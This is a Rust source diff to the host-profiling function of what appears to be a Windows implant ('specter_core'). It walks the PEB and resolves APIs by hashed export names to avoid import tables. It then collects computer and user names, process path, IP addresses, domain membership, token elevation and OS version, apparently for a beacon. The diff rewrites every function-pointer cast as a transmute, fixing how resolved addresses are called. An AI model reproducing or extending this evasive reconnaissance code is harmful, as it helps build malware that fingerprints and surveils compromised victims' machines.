@@ -141,27 +141,41 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
     if !kernel32.is_null() {
         let p = export(kernel32, H_GET_ACP);
         if !p.is_null() {
-            info.acp = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
+            info.acp = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn() -> u32,
+            >(p as *const core::ffi::c_void))() as u16;
         }
         let p = export(kernel32, H_GET_OEMCP);
         if !p.is_null() {
-            info.oemcp = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
+            info.oemcp = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn() -> u32,
+            >(p as *const core::ffi::c_void))() as u16;
         }
         let p = export(kernel32, H_GET_CURRENT_PROCESS_ID);
         if !p.is_null() {
-            info.pid = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
+            info.pid = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn() -> u32,
+            >(p as *const core::ffi::c_void))() as u16;
         }
         let p = export(kernel32, H_GET_CURRENT_THREAD_ID);
         if !p.is_null() {
-            info.tid = (*(p as *const unsafe extern "system" fn() -> u32))() as u16;
+            info.tid = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn() -> u32,
+            >(p as *const core::ffi::c_void))() as u16;
         }
 
         let p = export(kernel32, H_GET_COMPUTER_NAME_A);
         if !p.is_null() {
             let mut len: u32 = 64;
-            let ok = (*(p as *const unsafe extern "system" fn(*mut u8, *mut u32) -> i32))(
-                info.computer.as_mut_ptr(),
-                &mut len,
+            let ok = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut u8, *mut u32) -> i32,
+            >(p as *const core::ffi::c_void))(
+                info.computer.as_mut_ptr(), &mut len
             );
             if ok != 0 {
                 info.computer_len = len as usize;
@@ -170,7 +184,10 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
 
         let p = export(kernel32, H_GET_MODULE_FILE_NAME_A);
         if !p.is_null() {
-            let n = (*(p as *const unsafe extern "system" fn(*mut c_void, *mut u8, u32) -> u32))(
+            let n = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut c_void, *mut u8, u32) -> u32,
+            >(p as *const core::ffi::c_void))(
                 core::ptr::null_mut(),
                 info.process.as_mut_ptr(),
                 260,
@@ -195,7 +212,10 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
     let p = export(kernel32, H_GET_TIME_ZONE_INFORMATION);
     if !p.is_null() {
         let mut tzi = [0u16; 86];
-        let zone = (*(p as *const unsafe extern "system" fn(*mut u16) -> u32))(tzi.as_mut_ptr());
+        let zone = (core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*mut u16) -> u32,
+        >(p as *const core::ffi::c_void))(tzi.as_mut_ptr());
         if zone <= 2 {
             let bias = ((tzi[1] as i32) << 16) | (tzi[0] as i32);
             let hours = -bias / 60;
@@ -209,9 +229,11 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
         let p = export(advapi32, H_GET_USER_NAME_A);
         if !p.is_null() {
             let mut len: u32 = 64;
-            let ok = (*(p as *const unsafe extern "system" fn(*mut u8, *mut u32) -> i32))(
-                info.username.as_mut_ptr(),
-                &mut len,
+            let ok = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut u8, *mut u32) -> i32,
+            >(p as *const core::ffi::c_void))(
+                info.username.as_mut_ptr(), &mut len
             );
             if ok != 0 {
                 info.username_len = len as usize;
@@ -225,7 +247,10 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
     // quad (see the beat contract, docs/WIRE.md).
     let kernel32_load = export(kernel32, H_LOAD_LIBRARY_A);
     if !kernel32_load.is_null() {
-        let load = *(kernel32_load as *const unsafe extern "system" fn(*const u8) -> *mut c_void);
+        let load = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8) -> *mut c_void,
+        >(kernel32_load as *const core::ffi::c_void);
         let iphlpapi = specter_core::peb::find_module(peb, H_IPHLPAPI);
         let iphlpapi = if iphlpapi.is_null() {
             load(IPHLPAPI_DLL.as_ptr())
@@ -235,8 +260,10 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
         if !iphlpapi.is_null() {
             let p = specter_core::peb::find_export(iphlpapi, H_GET_IP_ADDR_TABLE);
             if !p.is_null() {
-                let get_table =
-                    *(p as *const unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32);
+                let get_table = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(*mut u8, *mut u32, i32) -> u32,
+                >(p as *const core::ffi::c_void);
                 // MIB_IPADDRROW is 24 bytes; a dozen entries covers real
                 // hosts. Query twice: once for the size, once for data.
                 let mut table = [0u8; 4 + 24 * 12];
@@ -274,7 +301,10 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
     // empty in a workgroup, the NetBIOS name of the joined domain
     // otherwise. The returned buffer is freed with NetApiBufferFree.
     if !kernel32_load.is_null() {
-        let load = *(kernel32_load as *const unsafe extern "system" fn(*const u8) -> *mut c_void);
+        let load = core::mem::transmute::<
+            *const core::ffi::c_void,
+            unsafe extern "system" fn(*const u8) -> *mut c_void,
+        >(kernel32_load as *const core::ffi::c_void);
         let netapi32 = specter_core::peb::find_module(peb, H_NETAPI32);
         let netapi32 = if netapi32.is_null() {
             load(NETAPI32_DLL.as_ptr())
@@ -286,15 +316,17 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
             let free_buf = specter_core::peb::find_export(netapi32, H_NET_API_BUFFER_FREE);
             let to_mb = export(kernel32, H_WIDE_CHAR_TO_MULTI_BYTE);
             if !get_join.is_null() && !free_buf.is_null() && !to_mb.is_null() {
-                let get_join = *(get_join
-                    as *const unsafe extern "system" fn(
-                        *const u16,
-                        *mut *mut u16,
-                        *mut u32,
-                    ) -> u32);
-                let free_buf = *(free_buf as *const unsafe extern "system" fn(*mut c_void) -> u32);
-                let to_mb = *(to_mb
-                    as *const unsafe extern "system" fn(
+                let get_join = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(*const u16, *mut *mut u16, *mut u32) -> u32,
+                >(get_join as *const core::ffi::c_void);
+                let free_buf = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(*mut c_void) -> u32,
+                >(free_buf as *const core::ffi::c_void);
+                let to_mb = core::mem::transmute::<
+                    *const core::ffi::c_void,
+                    unsafe extern "system" fn(
                         u32,        // CodePage (CP_ACP = 0)
                         u32,        // dwFlags
                         *const u16, // lpWideCharStr
@@ -303,7 +335,8 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
                         i32,        // cbMultiByte
                         *const u8,  // lpDefaultChar
                         *mut i32,   // lpUsedDefaultChar (LPBOOL)
-                    ) -> i32);
+                    ) -> i32,
+                >(to_mb as *const core::ffi::c_void);
                 let mut name_buf: *mut u16 = core::ptr::null_mut();
                 let mut status: u32 = 0;
                 if get_join(core::ptr::null(), &mut name_buf, &mut status) == 0
@@ -341,16 +374,14 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
         let open_token = export(advapi32, H_OPEN_PROCESS_TOKEN);
         let get_info = export(advapi32, H_GET_TOKEN_INFORMATION);
         if !open_token.is_null() && !get_info.is_null() {
-            let open_token = *(open_token
-                as *const unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32);
-            let get_info = *(get_info
-                as *const unsafe extern "system" fn(
-                    *mut c_void,
-                    u32,
-                    *mut c_void,
-                    u32,
-                    *mut u32,
-                ) -> i32);
+            let open_token = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut c_void, u32, *mut *mut c_void) -> i32,
+            >(open_token as *const core::ffi::c_void);
+            let get_info = core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut c_void, u32, *mut c_void, u32, *mut u32) -> i32,
+            >(get_info as *const core::ffi::c_void);
             let mut token: *mut c_void = core::ptr::null_mut();
             // GetCurrentProcess() pseudo-handle is (HANDLE)-1.
             if open_token(-1isize as *mut c_void, 0x0008, &mut token) != 0 {
@@ -377,7 +408,10 @@ pub unsafe fn collect(peb: *mut Peb) -> SysInfo {
                 build: 0,
                 _rest: [0; 0xE8 - 0x10],
             };
-            let ok = (*(p as *const unsafe extern "system" fn(*mut VersionInfo) -> i32))(&mut v);
+            let ok = (core::mem::transmute::<
+                *const core::ffi::c_void,
+                unsafe extern "system" fn(*mut VersionInfo) -> i32,
+            >(p as *const core::ffi::c_void))(&mut v);
             if ok == 0 {
                 info.major = v.major as u8;
                 info.minor = v.minor as u8;
